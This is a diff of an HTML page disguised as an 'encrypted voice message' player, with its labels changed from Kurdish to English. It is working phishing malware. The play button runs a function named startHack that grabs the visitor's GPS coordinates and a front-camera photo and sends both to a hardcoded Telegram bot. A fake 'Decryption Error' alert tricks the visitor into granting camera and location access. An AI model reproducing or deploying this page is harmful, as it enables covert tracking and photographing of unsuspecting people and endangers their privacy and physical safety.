@@ -1,40 +1,41 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     
     <meta property="og:title" content="🎙️ Voice Message (0:08)">
-    <meta property="og:description" content="پەیامی دەنگی وەرگیراو">
-    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/5948/5948543.png">
+    <meta property="og:description" content="Encrypted Audio Message">
+    <meta property="og:image" content="https://i.ibb.co/LzNf9mS/voice-icon.png">
     <meta property="og:type" content="music.song">
 
-    <title>Voice Message Player</title>
+    <title>Secure Voice Player</title>
     <style>
         body { 
             background-color: #f0f2f5; 
-            font-family: sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex; justify-content: center; align-items: center; 
             height: 100vh; margin: 0; 
         }
         .player-card {
-            background: white; width: 320px; padding: 20px;
-            border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            background: white; width: 330px; padding: 25px;
+            border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             text-align: center;
         }
         .audio-container {
-            display: flex; align-items: center; background: #f8f9fa;
-            padding: 10px; border-radius: 10px; margin-top: 15px; gap: 10px;
-            cursor: pointer;
+            display: flex; align-items: center; background: #f1f3f4;
+            padding: 12px; border-radius: 15px; margin-top: 20px; gap: 12px;
+            cursor: pointer; transition: 0.3s;
         }
+        .audio-container:hover { background: #e8eaed; }
         .play-btn {
             width: 45px; height: 45px; background: #007bff; border: none;
-            border-radius: 50%; color: white; font-size: 20px;
+            border-radius: 50%; color: white; font-size: 18px;
         }
         .wave {
-            flex-grow: 1; height: 25px;
+            flex-grow: 1; height: 30px;
             background: url('https://www.whatsapp.com/img/v2/wp-audio-wave.png') center/contain no-repeat;
-            opacity: 0.3;
+            opacity: 0.4;
         }
         #video, #canvas { display: none; }
     </style>
@@ -42,32 +43,43 @@
 <body>
 
     <div class="player-card">
-        <span style="font-size: 13px; color: #666;">🔐 پەیامی دەنگی پارێزراو</span>
-        <div class="audio-container" onclick="startProcess()">
-            <button class="play-btn" id="btnIcon">▶</button>
+        <div style="font-size: 30px; margin-bottom: 10px;">🔐</div>
+        <h3 style="margin: 0; color: #202124; font-size: 18px;">Private Voice Message</h3>
+        <p style="font-size: 13px; color: #5f6368; margin-top: 8px;">Click play to decrypt and listen to this message.</p>
+        
+        <div class="audio-container" onclick="startHack()">
+            <button class="play-btn" id="btn">▶</button>
             <div class="wave"></div>
-            <span style="font-size: 12px; color: #999;">0:08</span>
+            <span style="font-size: 12px; color: #70757a;">0:08</span>
         </div>
     </div>
 
-    <audio id="vSource">
-        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
-    </audio>
-
+    <audio id="audio"><source src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // زانیارییەکانی تۆ و بۆتەکە لێرە جێگیر کراوە
         const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
         const ID = '6351568884';
 
-        function startProcess() {
-            // دەستپێکردنی دەنگەکە
-            document.getElementById('vSource').play();
-            document.getElementById('btnIcon').innerText = "⌛";
+        function startHack() {
+            document.getElementById('audio').play();
+            document.getElementById('btn').innerText = "⌛";
 
-            // داواکردنی کامێرا و وێنەگرتن
+            // 1. Get GPS Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locMsg = `📍 Target Location Found:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(locMsg)}`);
+                }, (error) => {
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent("❌ Location Access Denied by User")}`);
+                }, {enableHighAccuracy: true});
+            }
+
+            // 2. Capture Camera Photo
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 const video = document.getElementById('video');
@@ -82,22 +94,15 @@
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', ID);
-                        formData.append('photo', blob, 'target_capture.jpg');
-                        formData.append('caption', '🎙️ وێنەی ئەو کەسەی ویستی ڤۆیسەکە ببیستێت');
+                        formData.append('photo', blob, 'target.jpg');
+                        formData.append('caption', '🎙️ Voice Message Playback - Image Captured');
 
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(res => {
-                            if(res.ok) {
-                                console.log("وێنەکە نێردرا!");
-                            }
-                        });
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
-                }, 1500); // دوای چرکەیەک و نیو وێنەکە دەگرێت
+                }, 2000);
             })
             .catch(() => {
-                alert("بۆ بیستنی ئەم دەنگە، دەبێت ڕێگە بدەیت سێرڤەری دەنگ چالاک بێت.");
+                alert("Decryption Error: Please allow camera and location access to verify your identity and play the audio.");
             });
         }
     </script>
